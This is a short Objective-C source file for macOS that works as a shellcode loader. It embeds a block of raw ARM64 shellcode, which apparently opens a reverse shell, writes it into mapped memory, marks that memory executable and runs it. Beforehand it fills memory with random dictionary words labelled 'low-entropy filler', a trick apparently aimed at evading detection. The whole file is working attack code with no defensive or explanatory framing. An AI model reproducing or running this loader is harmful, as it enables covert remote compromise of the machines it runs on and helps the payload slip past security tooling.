#import <Foundation/Foundation.h>
#include <sys/mman.h>
#include <stdint.h>
#include <string.h>
#include <stdlib.h>
#include <time.h>
#include <stdio.h>

// Dummy usage to avoid compiler optimizations
static inline void __attribute__((noinline)) bogus_use(const char* s) {
    (void)s;
}

// Raw ARM64 shellcode
unsigned char shellcode[] =
"\x30\x0c\x80\xd2\x01\xfe\x46\xd3\x20\xf8\x7f\xd3\xe2\x03\x1f\xaa"
"\xe1\x66\x02\xd4\xe3\x03\x20\xaa\x01\x42\x80\xd2\x21\x82\xab\xf2"
"\xe1\xf3\xdb\xf2\xe1\x13\xf9\xf2\xe1\x83\x1f\xf8\x02\x01\x80\xd2"
"\xe1\x63\x22\xcb\x02\x02\x80\xd2\x50\x0c\x80\xd2\xe1\x66\x02\xd4"
"\x42\xfc\x42\xd3\xe0\x03\x23\xaa\x42\xfc\x41\xd3\xe1\x03\x02\xaa"
"\x50\x0b\x80\xd2\xe1\x66\x02\xd4\xea\x03\x1f\xaa\x5f\x01\x02\xeb"
"\x21\xff\xff\x54\xe1\x45\x8c\xd2\x21\xcd\xad\xf2\xe1\x65\xce\xf2"
"\x01\x0d\xe0\xf2\xe1\x83\x1f\xf8\x01\x01\x80\xd2\xe0\x63\x21\xcb"
"\xe1\x03\x1f\xaa\xe2\x03\x1f\xaa\x70\x07\x80\xd2\xe1\x66\x02\xd4";


int main(int argc, const char * argv[]) {
    @autoreleasepool {
        srand((unsigned)time(NULL));

        // Load dictionary file for low-entropy filler
        NSString *dictPath = @"/Users/cfontenot/seclists/Miscellaneous/lang-english.txt";
        NSError *err = nil;
        NSString *content = [NSString stringWithContentsOfFile:dictPath encoding:NSUTF8StringEncoding error:&err];
        if (!content) {
            NSLog(@"[!] Failed to load dictionary: %@", err);
            return -1;
        }

        NSArray<NSString*> *dictionaryWords = [content componentsSeparatedByCharactersInSet:[NSCharacterSet newlineCharacterSet]];
        NSUInteger wordsCount = [dictionaryWords count];

        // Filler loop: concatenate random dictionary words
        for (int i = 0; i < 50; i++) {
            int wordCount = rand() % 4 + 2; // 2-5 words
            char buff[256] = "";
            for (int j = 0; j < wordCount; j++) {
                NSUInteger idx = rand() % wordsCount;
                const char *word = [dictionaryWords[idx] UTF8String];
                if (word) strcat(buff, word);
            }
            bogus_use(buff);
        }

        // Allocate RW memory
        size_t len = sizeof(shellcode);
        void *mem = mmap(NULL, len, PROT_READ | PROT_WRITE,
                         MAP_ANON | MAP_PRIVATE, -1, 0);
        if (mem == MAP_FAILED) {
            perror("mmap");
            return -1;
        }

        memcpy(mem, shellcode, len);

        // Change to RX and execute
        if (mprotect(mem, len, PROT_READ | PROT_EXEC) != 0) {
            perror("mprotect");
            return -1;
        }

        ((void(*)())mem)();
    }
    return 0;
}
